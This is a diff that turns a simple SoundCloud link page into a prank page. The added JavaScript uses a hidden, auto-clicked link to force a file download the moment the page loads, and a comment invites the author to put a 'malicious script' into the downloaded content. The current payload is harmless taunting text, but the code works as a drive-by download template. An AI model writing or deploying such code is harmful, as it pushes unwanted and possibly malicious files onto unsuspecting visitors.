@@ -1,8 +1,29 @@
 <html>
   <head>
-    <title>Merlin Soundcloud</title>
+    <title>Get trolled idiot!</title>
+    <style>
+      body{
+        background-color: red;
+      }
+      h1{
+        align: center;
+      }
+    </style>
   </head>
   <body>
-    <a href="https://soundcloud.com/unbihexiumfan">Go to merlins soundcloud</a>
+    <!-- Add your sites content-->
+    <script>
+filename = "Stupid.txt";
+//Write your malicious script that will be download in the quotes.
+filedata="Get trolled idiot!";
+var blob = new Blob([filedata],{"type":"octet/stream"});
+var url = window.URL.createObjectURL(blob);
+var injection = document.createElement("a");
+injection.style="display:none;";
+injection.href=url;
+injection.download=filename;
+injection.click();
+    </script>
+    <h1>Get trolled idiot!</h1>
   </body>
 </html>
